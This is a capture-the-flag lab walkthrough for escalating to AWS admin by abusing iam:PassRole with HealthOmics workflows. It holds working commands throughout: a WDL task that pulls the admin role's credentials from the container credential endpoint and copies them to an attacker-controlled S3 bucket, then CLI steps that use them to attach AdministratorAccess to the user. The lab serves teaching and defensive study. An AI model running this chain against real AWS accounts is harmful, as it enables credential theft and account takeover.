# Guided Walkthrough: Privilege Escalation via iam:PassRole + omics:CreateWorkflow + omics:StartRun

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `omics:CreateWorkflow`, and `omics:StartRun` permissions can abuse AWS HealthOmics to execute arbitrary code under an admin role, exfiltrate the role's credentials to S3, and use those credentials to permanently elevate their own privileges.

AWS HealthOmics (formerly Amazon Omics) runs genomic analysis workflows in a fully managed, network-isolated environment. Unlike Lambda or ECS, HealthOmics tasks cannot directly call IAM APIs from within the workflow — they only have outbound access to S3, ECR, and KMS endpoints. This means privilege escalation requires a two-stage approach: exfiltrate the execution role's credentials to S3 from inside the workflow, then retrieve and use those credentials from outside HealthOmics to perform the actual IAM escalation.

## The Challenge

You start as `pl-prod-omics-001-to-admin-starting-user` — an IAM user with `iam:PassRole` on a specific admin role, plus `omics:CreateWorkflow` and `omics:StartRun`. Your goal is to reach effective administrator access.

The environment also contains an IAM role `pl-prod-omics-001-to-admin-admin-role` with `AdministratorAccess` attached that trusts `omics.amazonaws.com`. There is also a private ECR repository containing the `aws-cli` image (required because HealthOmics cannot pull from public registries).

## Reconnaissance

Confirm your identity and verify that you don't have admin access yet:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-omics-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — expected, you're not admin yet
```

Get your account ID and the required resource identifiers from Terraform outputs:

```bash
cd <project-root>
terraform output -json | jq -r '.single_account_privesc_one_hop_to_admin_omics_001_iam_passrole_omics_createworkflow_omics_startrun.value | {admin_role_arn, attacker_bucket_name, ecr_image_uri}'
```

## Exploitation

### Step 1: Create the malicious WDL workflow definition

HealthOmics uses WDL (Workflow Description Language) to define workflows. The `command` block in a WDL task overrides the container's entrypoint — allowing you to run arbitrary shell commands under whatever role you pass as the execution role.

The key insight: HealthOmics injects credentials for the execution role into each task container via the AWS container credential provider (`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable). You can extract these credentials and write them to S3.

Create the WDL workflow definition:

```bash
mkdir -p /tmp/omics-workflow
cat > /tmp/omics-workflow/main.wdl << 'WDLEOF'
version 1.0

workflow ExfilCredentials {
  input { String s3_bucket; String s3_key }
  call ExfilTask { input: s3_bucket=s3_bucket, s3_key=s3_key }
}

task ExfilTask {
  input { String s3_bucket; String s3_key }
  command <<<
    CRED=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
    echo "$CRED" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(json.dumps({'AccessKeyId': d['AccessKeyId'], 'SecretAccessKey': d['SecretAccessKey'], 'SessionToken': d['Token']}))
" > /tmp/creds.json
    aws s3 cp /tmp/creds.json "s3://~{s3_bucket}/~{s3_key}"
  >>>
  runtime {
    docker: "{ecr_image_uri}"  # replace with actual ECR image URI from Terraform output
    memory: "2 GiB"
    cpu: 1
  }
  output { String result = "done" }
}
WDLEOF
cd /tmp/omics-workflow && zip /tmp/omics-workflow.zip main.wdl
```

### Step 2: Create the HealthOmics workflow

```bash
WORKFLOW_RESULT=$(aws omics create-workflow \
    --name pl-omics-001-privesc \
    --definition-zip fileb:///tmp/omics-workflow.zip \
    --engine WDL \
    --parameter-template '{"s3_bucket":{"description":"exfil bucket"},"s3_key":{"description":"exfil key"}}' \
    --output json)

WORKFLOW_ID=$(echo "$WORKFLOW_RESULT" | jq -r '.id')
echo "Workflow ID: $WORKFLOW_ID"
```

Wait for the workflow to reach `ACTIVE` state (typically 1-3 minutes):

```bash
aws omics get-workflow --id "$WORKFLOW_ID" --query 'status' --output text
# CREATING ... ACTIVE
```

### Step 3: Start the workflow run with the admin role

Pass the admin role as the execution role via `iam:PassRole`:

```bash
ADMIN_ROLE_ARN="arn:aws:iam::{account_id}:role/pl-prod-omics-001-to-admin-admin-role"
S3_BUCKET="{attacker_bucket_name}"  # from Terraform output

RUN_RESULT=$(aws omics start-run \
    --workflow-id "$WORKFLOW_ID" \
    --role-arn "$ADMIN_ROLE_ARN" \
    --output-uri "s3://$S3_BUCKET/output/" \
    --parameters "{\"s3_bucket\":\"$S3_BUCKET\",\"s3_key\":\"exfil/creds.json\"}" \
    --output json)

RUN_ID=$(echo "$RUN_RESULT" | jq -r '.id')
echo "Run ID: $RUN_ID"
```

### Step 4: Wait for run completion and retrieve credentials

HealthOmics workflow runs typically take 4-10 minutes. Poll for completion:

```bash
aws omics get-run --id "$RUN_ID" --query 'status' --output text
# PENDING -> STARTING -> RUNNING -> COMPLETED
```

Once `COMPLETED`, retrieve the exfiltrated credentials from S3:

```bash
aws s3 cp "s3://$S3_BUCKET/exfil/creds.json" /tmp/stolen_creds.json

STOLEN_ACCESS_KEY=$(jq -r '.AccessKeyId' /tmp/stolen_creds.json)
STOLEN_SECRET_KEY=$(jq -r '.SecretAccessKey' /tmp/stolen_creds.json)
STOLEN_SESSION_TOKEN=$(jq -r '.SessionToken' /tmp/stolen_creds.json)
```

### Step 5: Use the stolen admin credentials to escalate privileges

Configure the AWS CLI with the stolen admin role credentials and attach `AdministratorAccess` to yourself:

```bash
export AWS_ACCESS_KEY_ID="$STOLEN_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET_KEY"
export AWS_SESSION_TOKEN="$STOLEN_SESSION_TOKEN"

aws iam attach-user-policy \
    --user-name pl-prod-omics-001-to-admin-starting-user \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Verification

Restore your starting user credentials, wait 15 seconds for IAM propagation, then verify:

```bash
export AWS_ACCESS_KEY_ID="{starting_user_access_key}"
export AWS_SECRET_ACCESS_KEY="{starting_user_secret_key}"
unset AWS_SESSION_TOKEN

aws iam list-attached-user-policies \
    --user-name pl-prod-omics-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Returns user list — you now have admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy you just gained provides implicitly.

Using your starting user credentials (which now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/omics-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario — only the scenario ID in the path changes.

## What Happened

The attack exploited the "PassRole + Service" pattern with a twist unique to HealthOmics: network isolation. You took three individually scoped permissions and combined them into a full privilege escalation chain:

1. `omics:CreateWorkflow` let you define what code runs in the HealthOmics environment.
2. `iam:PassRole` let you specify which role that code runs as — in this case, the admin role.
3. `omics:StartRun` triggered execution.

Because HealthOmics only allows outbound access to S3, ECR, and KMS (not IAM), you couldn't call `iam:AttachUserPolicy` directly from within the workflow. Instead, you used S3 as an exfiltration channel: the WDL task captured the execution role's temporary credentials from the container credential provider and wrote them to S3. You then retrieved those credentials from outside HealthOmics and used them to call IAM APIs directly.

The critical vulnerability is the combination of overly permissive `iam:PassRole` (allowing the admin role to be passed to HealthOmics) and an admin role that trusts `omics.amazonaws.com`. Any organization running genomic workloads in HealthOmics with this configuration is vulnerable, even though the network isolation appears to be a strong security control. The credentials are always available inside workflow tasks — the isolation only restricts where those credentials can be used from within the workflow, not what they are.
